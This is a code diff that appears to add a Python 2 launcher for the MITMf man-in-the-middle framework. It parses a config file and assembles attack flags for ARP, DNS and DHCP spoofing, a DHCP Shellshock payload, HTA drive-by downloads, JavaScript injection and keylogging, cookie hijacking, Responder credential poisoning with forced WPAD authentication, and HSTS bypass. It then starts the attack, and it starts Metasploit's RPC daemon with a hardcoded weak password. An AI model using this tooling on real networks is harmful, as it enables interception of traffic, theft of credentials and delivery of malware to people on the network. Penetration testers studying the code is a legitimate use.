@@ -18,7 +18,226 @@ def get_gw():
     interface = gws['default'][netifaces.AF_INET][1]
     gw = gateway_ip
     return gw
+def readToLines(config_file):
+    r = popen_background("cat mitmf.cfg  | grep -vi \#")
+    # print str(r)
+    l = r.splitlines()
+    return l
 
+def getProxyARPiface1(config_file):
+    lines = readToLines(config_file)
+    for line in lines:
+        if re.search("NETIFACE_ONE",line):
+            i = line.split(" = ")
+            iface1 = str(i[1])
+    return iface1
+
+def getProxyARPiface2(config_file):
+    lines = readToLines(config_file)
+    for line in lines:
+        if re.search("NETIFACE_TWO",line):
+            i = line.split(" = ")
+            iface2 = str(i[1])
+    return iface2
+
+def togglePARPDebugMode(lines, c):
+    for line in lines:
+        if re.search("PARP_DEBUG_MODE",line):
+            i = line.split(" = ")
+            if i[1] == "1":
+                c = c + " -d"
+                print str(c)
+            else:
+                pass
+    return c
+def startProxyARP(cmd):
+    lines = readToLines(config_file)
+    c = "parprouted"
+    iface1 = getProxyARPiface1(config_file)
+    iface2 = getProxyARPiface2(config_file)
+    c = togglePARPDebugMode(lines, c)
+    for line in lines:
+        if re.search("PROXY_ARP_MODE", line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                c = c + " {} {} &".format(str(iface1),str(iface2))
+                bash_cmd(c)
+                print str(c)
+    return cmd
+def readConfig(config_file):
+    cmd = "mitmf"
+    # f = open(config_file,'r')
+    # r = f.read()
+    # l = r.splitlines()
+    r = popen_background("cat mitmf.cfg  | grep -vi \#")
+    # print str(r)
+    l = r.splitlines()
+    for line in l:
+        if re.search("INTERFACE", line):
+            s = line.split(" = ")
+            iface = s[1]
+            cmd = cmd + " -i {}".format(str(iface))
+            print cmd
+        if re.search("INJECT", line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --inject"
+        if re.search("JS_URL", line):
+            s = line.split(" = ")
+            if s[1] != "":
+                cmd = cmd + " --js-url {}".format(str(s[1]))
+        if re.search("HTML_URL",line):
+            s = line.split(" = ")
+            if s[1] != "":
+                cmd = cmd + " --html-url {}".format(str(s[1]))
+        if re.search("HTA_DRIVEBY",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --hta"
+        if re.search("HTA_TEXT",line):
+            s = line.split(" = ")
+            if s[1] != "":
+                cmd = cmd + " --text {}".format(str(s[1]))
+        if re.search("HTA_APP",line):
+            s = line.split(" = ")
+            if s[1] != "":
+                cmd = cmd + " --hta-app {}".format(str(s[1]))
+        if re.search("SPOOF",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --spoof"
+        if re.search("SPOOF_TYPE",line):
+            s = line.split(" = ")
+            if s[1] != "":
+                if s[1] == "ARP":
+                    cmd = cmd + " --arp"
+                    for line in l:
+                        if re.search("ARP_MODE",line):
+                            s = line.split(" = ")
+                            amode = "rep"
+                            if s[1] == "REQUEST":
+                                amode = "req"
+                                cmd = cmd + " --arpmode {}".format(str(amode))
+                            if s[1] == "REPLY":
+                                amode = "rep"
+                                cmd = cmd + " --arpmode {}".format(str(amode))
+                if s[1] == "DNS":
+                    cmd = cmd + " --dns"
+                if s[1] == "DHCP":
+                    cmd = cmd + " --dhcp"
+                    for line in l:
+                        if re.search("DHCP_SHELLSHOCK_PAYLOAD",line):
+                            s = line.split(" = ")
+                            cmd = cmd + " --shellshock {}".format(str(s[1]))
+                if s[1] == "ICMP":
+                    cmd = cmd + " --icmp"
+        if re.search("AUTO_ACQUIRE_GATEWAY",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                gw = userSelectGateway()
+                cmd = cmd + " --gateway {}".format(str(gw))
+            else:
+                for line in l:
+                    if re.search("SPOOF_GATEWAY",line):
+                        s = line.split(" = ")
+                        if s[1] != "":
+                            cmd = cmd + " --gateway {}".format(str(s[1]))
+                    if re.search("SPOOF_GATEWAY_MAC",line):
+                        s = line.split(" = ")
+                        if s[1] != "":
+                            cmd = cmd + " --gatewaymac {}".format(str(s[1]))
+        if re.search("SPOOF_TARGET",line):
+            s = line.split(" = ")
+            if s[1] != "":
+                cmd = cmd + " --targets {}".format(str(s[1]))
+        if re.search("APP_POISON",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --appoison"
+        if re.search("UPSIDEDOWN_INTERNET",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --upsidedownternet"
+        if re.search("BROWSER_PROFILER",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --browserprofiler"
+        if re.search("FILEPWN",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --filepwn"
+        if re.search("SMB_AUTH",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --smbauth"
+        if re.search("FERRET_NG",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --ferretng"
+        if re.search("FERRET_NG_PORT",line):
+            s = line.split(" = ")
+            if s[1] != "":
+                cmd = cmd + " --port {}".format(str(s[1]))
+        if re.search("FERRET_NG_COOKIES",line):
+            s = line.split(" = ")
+            if s[1] != "":
+                cmd = cmd + " --load-cookies {}".format(str(s[1]))
+        if re.search("BROWSER_SNIPER",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --browsersniper"
+        if re.search("JS_KEYLOGGER",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --jskeylogger"
+        if re.search("""REPLACE""",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --replace"
+        if re.search("HSTS",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --hsts"
+        if re.search("RESPONDER_PLUGIN",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --responder"
+        if re.search("RESPONDER_ANALYZE",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --analyze"
+        if re.search("RESPONDER_WREDIR",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --wredir"
+        if re.search("RESPONDER_NBTNS",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --nbtns"
+        if re.search("RESPONDER_FINGERPRINT",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --fingerprint"
+        if re.search("RESPONDER_LM",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --lm"
+        if re.search("RESPONDER_WPAD",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --wpad"
+        if re.search("RESPONDER_FORCE_WPADAUTH",line):
+            s = line.split(" = ")
+            if s[1] == "1":
+                cmd = cmd + " --forcewpadauth"
+    cmd = startProxyARP(cmd)
+    print str(cmd)
+    startAttack(cmd)
+    return cmd
+
+def startMsfrpcd():
+    bash_cmd("msfrpcd -U msf -P abc123 -a 127.0.0.1 -p 55552")
+    return
 def userSelectGateway():
     gws = netifaces.gateways()
     gwDict = {}
